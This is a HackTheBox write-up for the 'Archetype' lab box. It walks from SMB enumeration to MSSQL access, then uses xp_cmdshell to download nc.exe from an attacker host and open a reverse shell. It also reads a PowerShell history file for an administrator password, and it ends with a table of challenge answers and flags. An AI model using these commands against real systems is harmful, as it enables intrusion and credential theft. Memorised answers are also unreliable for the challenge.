TITLE: Archetype
CATEGORY: HackTheBox
DATE: 2026-05-07
IMAGE: ./assets/Archetype.png
---

# Archetype

This box demonstrates a classic privilege escalation chain: sensitive information disclosure in a public SMB share leading to a service account compromise, followed by credential reuse and history file enumeration to gain full administrative access.

## Recon

The initial Nmap scan reveals standard Windows services, including SMB (445) and Microsoft SQL Server (1433).

```bash
nmap -sC -sV 10.129.142.167
```

| Port | Service | Version |
| :--- | :--- | :--- |
| 135 | MSRPC | Microsoft Windows RPC |
| 139 | NetBIOS | Microsoft Windows netbios-ssn |
| 445 | SMB | Windows Server 2019 Standard 17763 |
| 1433 | MS-SQL | Microsoft SQL Server 2017 14.00.1000.00 |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 |

### SMB Enumeration

Checking for anonymous SMB shares reveals a `backups` directory:

```bash
smbclient -L 10.129.142.167 -N
```

Connecting to the share, we find `prod.dtsConfig`:

```bash
smbclient //10.129.142.167/backups -N
smb: \> get prod.dtsConfig
```

Opening the file reveals cleartext credentials for the SQL service account:
- **User**: `ARCHETYPE\sql_svc`
- **Password**: `M3g4c0rp123`

## Exploitation

### MSSQL Access

Using Impacket's `mssqlclient.py`, we can authenticate using the recovered credentials:

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.142.167 -windows-auth
```

Once connected, we verify we have `sysadmin` privileges:

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

### Remote Code Execution

We can enable `xp_cmdshell` to execute system commands:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

To gain a stable shell, we transfer `nc.exe` to the target and execute a reverse shell:

```sql
xp_cmdshell "powershell.exe IWR -uri http://10.10.14.x/nc.exe -OutFile C:\Users\Public\nc.exe"
xp_cmdshell "C:\Users\Public\nc.exe -e cmd.exe 10.10.14.x 4444"
```

## Privilege Escalation

After gaining a shell as `sql_svc`, we check the PowerShell history file for sensitive commands:

```cmd
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

The history reveals an `administrator` password used during a drive mapping: `MEGACORP_4_L1f3`.

Finally, we use Impacket's `psexec.py` to gain a SYSTEM shell:

```bash
python3 psexec.py administrator@10.129.142.167
```

## Tasks

| Task | Question | Answer |
| :--- | :--- | :--- |
| 1 | Which TCP port is hosting a database server? | `1433` |
| 2 | What is the name of the non-administrative share available over SMB? | `backups` |
| 3 | What is the password identified in the file on the SMB share? | `M3g4c0rp123` |
| 4 | What script from Impacket collection can be used to establish an authenticated connection to the Microsoft SQL Server? | `mssqlclient.py` |
| 5 | What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? | `xp_cmdshell` |
| 6 | What script from Impacket collection can be used in order to obtain a reverse shell on the host using the recovered administrator credentials? | `psexec.py` |
| 7 | What is the user flag? | `3e7b102e78b10ef235ef9b03657cd55d` |
| 8 | What is the root flag? | `b91ccec3305e77125345759aa705f03d` |
